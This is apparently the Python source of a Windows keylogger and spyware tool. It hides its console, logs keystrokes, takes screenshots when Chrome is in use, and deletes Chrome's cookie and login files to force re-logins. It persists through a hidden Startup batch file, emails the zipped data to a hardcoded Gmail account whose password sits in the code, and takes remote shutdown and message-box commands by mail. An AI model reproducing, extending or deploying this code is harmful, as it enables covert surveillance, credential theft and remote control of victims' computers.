import time
import os
import pymsgbox
from KeyCatcher import KeyCatcher
import pythoncom
from multiprocessing import Process
import win32console
import win32gui
import Email
from uuid import getnode as get_mac
import DataInfo
import getpass
import ctypes
import sys
import uptime
import win32api
import win32con
import json_file
import datetime
import re
import socket
import psutil
import platform

MY_IP = socket.gethostbyname(socket.gethostname())
HISTORY_FILE_NAME = "history.json"
USER_NAME = getpass.getuser()
PLATFORM = platform.system()
DATA_INFO = DataInfo.DataInfo("", "jpg", "json")
MAC_ADDRESS = str(get_mac())
CURRENT_PATH = os.path.dirname(os.path.realpath(__file__))
MY_MAIL = "firstmanage1@gmail.com"
MY_PASSWORD = "roi123456789"
TARGET = MY_MAIL
COMMAND_COUNT_FILE = "count.log"
STARTUP_DIR = \
    r'C:\Users\%s' \
    r'\AppData\Roaming\Microsoft\Windows\Start Menu' \
    r'\Programs\Startup' % USER_NAME


def get_time_since_uptime():
    return uptime.uptime()


def send_zipped_mails_loop():
    while True:
        try:
            if len(os.listdir(DATA_INFO.get_type_path("jpg"))) > 300:
                try:
                    send_zipped_mails()
                except socket.gaierror:
                    continue
        except WindowsError:
            continue


def send_zipped_mails():
    """
    send myself emails which include the zipped data files and cookies
    """
    data_dir_path = DATA_INFO.all_data_path
    zipped_data_path = DATA_INFO.zip_dir(data_dir_path)
    e = Email.Email(MY_MAIL, MY_PASSWORD)
    e.login()
    e.send_mail(TARGET, USER_NAME + " data", MAC_ADDRESS, zipped_data_path)
    # delete the zip file
    zip_path = '\\'.join(DATA_INFO.all_data_path.split('\\')[:-1]) \
               + "\\data.zip"
    os.remove(zip_path)
    # delete the data file
    DATA_INFO.delete_data_file("data_file.log")
    # clear the screenshots' dir
    DATA_INFO.clear_dir("jpg")


def add_to_startup(file_path=""):
    """
    create a bat file which start the key logger on boot
    @param file_path: the path to the file we that we want to start on boot
    """
    if file_path == "":
        file_path = os.path.realpath(__file__)
    bat_path = STARTUP_DIR
    if not os.path.exists(bat_path + '\\' + "open.bat"):
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)
        # make file hidden
        if PLATFORM == "Windows":
            win32api.SetFileAttributes(bat_path + '\\' + "open.bat",
                                       win32con.FILE_ATTRIBUTE_HIDDEN)
        elif PLATFORM == "Linux":
            os.rename(bat_path + '\\' +
                      "open.bat", bat_path + '\\' + ".open.bat")


def run_as_admin(argv=None, debug=False):
    """
    ask the user for admin
    """
    shell32 = ctypes.windll.shell32
    if argv is None and shell32.IsUserAnAdmin():
        return True

    if argv is None:
        argv = sys.argv
    if hasattr(sys, '_MEIPASS'):
        # Support pyinstaller wrapped program.
        arguments = map(unicode, argv[1:])
    else:
        arguments = map(unicode, argv)
    argument_line = u' '.join(arguments)
    executable = unicode(sys.executable)
    if debug:
        print 'Command line: ', executable, argument_line
    ret = shell32.ShellExecuteW(
        None, u"runas", executable, argument_line, None, 1)
    if int(ret) <= 32:
        return False
    return None


def delete_chrome_cookie_file():
    """
    works on windows only.
    simply deletes the chrome's cookies
    """
    try:
        os.remove(
            r"C:\Users\%s\AppData\Local\Google\Chrome\
            User Data\Default\Cookies" % USER_NAME)
        os.remove(
            r"C:\Users\%s\AppData\Local\Google\Chrome\
            User Data\Default\Login Data" % USER_NAME)
        return True
    except WindowsError:
        return False


def delete_chrome_cookie_file_with_admin():
    """
    wait for the user to close google chrome in order to delete its cookies
    """
    was_deleted = delete_chrome_cookie_file()
    while not was_deleted:
        time.sleep(5)
        was_deleted = delete_chrome_cookie_file()
    DATA_INFO.new_data_file("cookies.log")


def shutdown():
    """
    shutdown the computer
    """
    os.system('shutdown -s')
    return


def hide_console():
    """
    hide the console window
    """
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return


def add_to_json_file(file_root, key, value):
    """
    add something to a json file
    @param file_root: root to file
    @param key: the key to insert
    @param value: value to insert
    """
    my_file = json_file.JsonFile(file_root)
    my_file.add_to_file(key, value)
    return


def get_date_time_now():
    """
    returns a format of date&time
    """
    now = datetime.datetime.now()
    return str(now.day) + "/" + \
        str(now.month) + "/" + \
        str(now.year) + "----" + \
        str(now.hour) + ":" + \
        str(now.minute)


def main():
    hide_console()
    # choose dir for the keyloger to save files in
    key_logger = KeyCatcher(CURRENT_PATH + "\\data")
    key_logger.set_key_hook()
    if not DATA_INFO.is_file(HISTORY_FILE_NAME):
        DATA_INFO.new_data_file(HISTORY_FILE_NAME)
    if not DATA_INFO.is_file("cookies.log"):
        if not delete_chrome_cookie_file():
            delete_cookies_process = Process(
                target=delete_chrome_cookie_file_with_admin)
            delete_cookies_process.start()
    DATA_INFO.new_data_file(COMMAND_COUNT_FILE)
    pictures_process = Process(target=take_pics_forever, args=(key_logger,))
    pictures_process.start()
    commands_process = Process(target=get_mail_commends_loop)
    commands_process.start()
    add_to_startup()
    zipped_mails_process = Process(target=send_zipped_mails_loop)
    zipped_mails_process.start()
    wait_for_messages_forever()


def replace_all(text, dic):
    """
    replaces all of the given keys in the dict to their values
    @param text: the text in which the func replaces the keys
    @param dic: the dictionary that contains keys and replace
    them with their values in the given text
    """
    for i, j in dic.iteritems():
        text = text.replace(i, j)
    return text


def take_pics_forever(key_logger):
    """
    takes screenshots for the keylogger
    """
    while True:
        open_window = is_time_for_pic()
        if not open_window:
            continue
        ip = open_window[1]
        open_window = open_window[0]
        if open_window:
            key_logger.take_screen_shot()
            replace_dict = {'?': '', '[': '', ']': '', '\'': '', ',': ''}
            open_window = replace_all(str(open_window.split(' - ')[:-1]),
                                      replace_dict)
            try:
                if '/' not in open_window and '\\' not in open_window:
                    add_to_json_file(DATA_INFO.get_type_path("json") +
                                     "\\" + HISTORY_FILE_NAME,
                                     open_window,
                                     get_date_time_now())
                else:
                    add_to_json_file(DATA_INFO.get_type_path("json") +
                                     "\\" + HISTORY_FILE_NAME,
                                     ip,
                                     get_date_time_now())
            except IOError:
                DATA_INFO.new_data_file(HISTORY_FILE_NAME)

            time.sleep(1)


def is_time_for_pic():
    """
    checks whether it is a good time to take a picture
    by observing the connections and currently open program
    """
    w = win32gui
    a = filter(lambda a: a.status == "SYN_SENT",
               psutil.net_connections(kind='tcp'))
    for index, item in enumerate(a):
        match_pid = re.search(ur"pid=\d*\d", str(item)).group()
        pid = match_pid[4:]
        pid_name = psutil.Process(int(pid)).name()
        try:
            match_ip = re.search(
                ur"raddr=addr\(ip='(\d*\.){3}\d*', port=443\)",
                str(item)).group()
            match_ip = re.search(ur"(\d*\.){3}\d*", match_ip).group()
            open_window = w.GetWindowText(w.GetForegroundWindow())
            if match_ip and "chrome" in pid_name and "Chrome" in open_window:
                return str(open_window), match_ip
        except AttributeError:
            pass
    return False


def wait_for_messages_forever():
    pythoncom.PumpMessages()


def get_mail_commends_loop():
    """
    always check whether new commands have arrived
    """
    while True:
        try:
            get_mail_commends()
        except socket.gaierror:
            pass


def receive_messages_multiprocessing():
    # set process
    p = Process(target=wait_for_messages_forever)
    p.start()
    return


def msg_box(msg, title):
    """
    send a message to the user
    @param msg: message to display
    @param title: the message title
    """
    return pymsgbox.prompt(msg, title)


def msgbox_handle(content):
    """
    if we got a msgbox command this function is called.
    it creates a msgbox on the user's computer and sends the user's response.
    @param content: the command mail content.
    """
    try:
        try:
            match = re.search("title:.*msg:.*", content)
            match = match.group()
        except AttributeError:
            match = re.search("msg:.*title:.*", content)
            match = match.group()
        junk = re.search("<.*?>", match)
        try:
            junk = junk.group()
        except AttributeError:
            pass
        while junk:
            match = match.replace(str(junk), "\n")
            junk = re.search("<.*?>", match)
            try:
                junk = junk.group()
            except AttributeError:
                junk = ""
            match = match.replace("\n\n", "\n")
        try:
            title = re.search("title:[\s\S]*msg:", match).group()
            msg = match.replace(title, "")[1:]
            title = title[len("title: "):-len("msg:")]
        except AttributeError:
            msg = re.search("msg:[\s\S]*title:", match).group()
            title = match.replace(msg, "")[1:]
            msg = msg[len("msg: "):-len("title:")]
        response = msg_box(msg, title)
        if response:
            e = Email.Email(MY_MAIL, MY_PASSWORD)
            e.login()
            e.send_mail(TARGET, USER_NAME +
                        " response " + MAC_ADDRESS, response)
    except AttributeError:
        pass


def handle_commands(content):
    """
    get the mail content and execute the new commands
    @param content_lines: the lines in which the commands are written
    """
    content_lines = content.split("\n")
    subject = content_lines[5]
    print content_lines
    if "shutdown" in subject:
        shutdown()
    elif "msgbox" in subject:
        msgbox_handle(content)


def get_mail_commends():
    """
    look for new sent commands and execute them
    """
    e = Email.Email(MY_MAIL, MY_PASSWORD)
    e.login()
    mails = e.get_all_mail()
    command_count = 0
    for mail in mails:
        content = e.get_mail_content(mail)
        content_lines = content.split("\n")
        subject = content_lines[5]
        if ("<%s>" % MY_MAIL) in content_lines[6]:
            if "command" in subject \
                    and MAC_ADDRESS in subject:
                e.delete_mail(mail)
                handle_commands(content)
            elif "all" in subject \
                    and "command" in subject:
                command_count += 1
                command_count_content = DATA_INFO.read_file(COMMAND_COUNT_FILE)
                if not command_count_content or \
                        command_count > int(command_count_content):
                    handle_commands(content)
    # update the number of commands committed
    try:
        DATA_INFO.delete_data_file(COMMAND_COUNT_FILE)
    except IOError:
        pass
    DATA_INFO.new_data_file(COMMAND_COUNT_FILE)
    DATA_INFO.write_data_file_end(str(command_count), COMMAND_COUNT_FILE)


if __name__ == '__main__':
    main()
